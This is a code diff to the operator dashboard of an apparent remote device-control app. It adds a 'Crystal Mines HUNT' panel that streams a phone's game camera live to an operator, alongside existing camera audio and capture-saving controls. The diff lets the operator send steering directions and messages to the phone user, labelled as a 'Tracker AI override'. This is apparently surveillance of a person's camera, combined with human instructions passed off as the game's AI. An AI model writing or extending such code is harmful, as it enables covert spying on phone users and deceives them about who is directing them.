@@ -62,6 +62,10 @@ class ControlCentreApp {
 
     this.setupRoutines();
 
+    document.querySelectorAll("#huntPanel [data-arrow]").forEach((b) => b.onclick = () => this.sendHuntCommand("", b.dataset.arrow));
+    const say = document.getElementById("huntSay");
+    if (say) say.onsubmit = (e) => { e.preventDefault(); const i = document.getElementById("huntText"); if (i.value.trim()) { this.sendHuntCommand(i.value.trim(), ""); i.value = ""; } };
+
     const scope = document.getElementById("captureScope");
     if (scope) {
       try { scope.value = localStorage.getItem("acc.captureScope") || "device"; } catch (e) {}
@@ -166,6 +170,10 @@ class ControlCentreApp {
         if (this.activeDevice && msg.device_id === this.activeDevice.id) {
           this.renderLiveFrame(msg.payload);
         }
+        break;
+
+      case "HUNT_STATE":
+        if (this.activeDevice && msg.device_id === this.activeDevice.id) this.onHuntState(msg.payload || {});
         break;
 
       case "CAMERA_AUDIO":
@@ -533,6 +541,51 @@ class ControlCentreApp {
     this.ws.send(JSON.stringify({ type: "START_CAMERA_STREAM", device_id: this.activeDevice.id, payload: { lens } }));
   }
 
+  // ----- Crystal Mines HUNT: the phone's game camera, live, with HQ instructions -----
+  onHuntState(p) {
+    const panel = document.getElementById("huntPanel");
+    if (!panel) return;
+    if (!p.active) {
+      panel.hidden = true;
+      if (this.live && this.live.on && this.live.hunt) this.stopLivePreview("the hunt ended");
+      return;
+    }
+    if (!this.live || !this.live.on) {
+      // show the hunt camera in the live stage (frames arrive as normal CAMERA_FRAMEs)
+      this.live = { on: true, lens: "back", frames: 0, fpsAt: Date.now(), hunt: true };
+      document.getElementById("liveTools").hidden = false;
+      document.getElementById("liveStage").hidden = false;
+      const lb = document.getElementById("btnLiveLens"); if (lb) lb.hidden = true;
+      const btn = document.getElementById("btnLivePreview");
+      if (btn) { btn.classList.add("on"); btn.innerText = "⏹ Stop Preview"; }
+      this.startLiveClock();
+      this.setLiveBadge("HUNT");
+    }
+    panel.hidden = false;
+    document.getElementById("huntDna").innerText = `🧬 ${p.dna || 0}/${p.total || 50} · 💎 ${p.shards || 0} · ⭐ LV ${p.level || 1}`;
+    const tgt = document.getElementById("huntTarget");
+    const c0 = (p.creatures || [])[0];
+    tgt.innerText = (p.ai ? `🛰 ${p.ai}\n` : "") + (c0 ? `${c0.name} · ${c0.dist} m · ${c0.mood} · weakness: ${c0.challenge} (${c0.how})${c0.exposed ? " — EXPOSED!" : ""}` : "Searching for a signature…")
+      + (p.locked ? "\n🔒 LOCKED — tell them to CAPTURE" : "");
+    tgt.className = "hunt-target" + (p.locked ? " locked" : p.target ? " seen" : "");
+    const box = document.getElementById("huntCreatures");
+    box.replaceChildren(...(p.creatures || []).map((c) => {
+      const d = document.createElement("span");
+      d.className = "hunt-chip r-" + String(c.rarity || "").toLowerCase();
+      const dir = c.on_screen ? "on screen" : (c.dx < 0 ? `◀ ${-c.dx}° left` : `${c.dx}° right ▶`);
+      d.innerText = `${c.name} · ${dir} · ${c.dist} m`;
+      d.title = "Click to send this direction to the hunter";
+      d.onclick = () => this.sendHuntCommand(c.on_screen ? `${c.name} is right in front of you!` : `${c.name}: turn ${c.dx < 0 ? "left" : "right"} about ${Math.abs(c.dx)}°`, c.on_screen ? "scan" : (c.dx < 0 ? "left" : "right"));
+      return d;
+    }));
+  }
+
+  sendHuntCommand(text, arrow) {
+    if (!this.activeDevice || !this.ws || this.ws.readyState !== WebSocket.OPEN) return;
+    this.ws.send(JSON.stringify({ type: "HUNT_COMMAND", device_id: this.activeDevice.id, payload: { text: text || "", arrow: arrow || "" } }));
+    this.setCaptureStatus("ok", "🛰 Tracker AI override sent: " + (text || arrow));
+  }
+
   // ⏱ how long the preview has been running; on stop, when and after how long it ended
   fmtDur(ms) {
     const t = Math.max(0, Math.floor(ms / 1000)), h = Math.floor(t / 3600), m = Math.floor((t % 3600) / 60), sec = t % 60;
@@ -563,6 +616,8 @@ class ControlCentreApp {
 
   stopLivePreview(reason) {
     this.stopLiveClock(reason);
+    const hp = document.getElementById("huntPanel"); if (hp) hp.hidden = true;
+    const lb = document.getElementById("btnLiveLens"); if (lb) lb.hidden = false;
     if (this.activeDevice && this.ws && this.ws.readyState === WebSocket.OPEN) {
       if (this.live && this.live.saving) this.ws.send(JSON.stringify({ type: "STOP_CAMERA_SAVE", device_id: this.activeDevice.id }));
       this.ws.send(JSON.stringify({ type: "STOP_CAMERA_STREAM", device_id: this.activeDevice.id }));
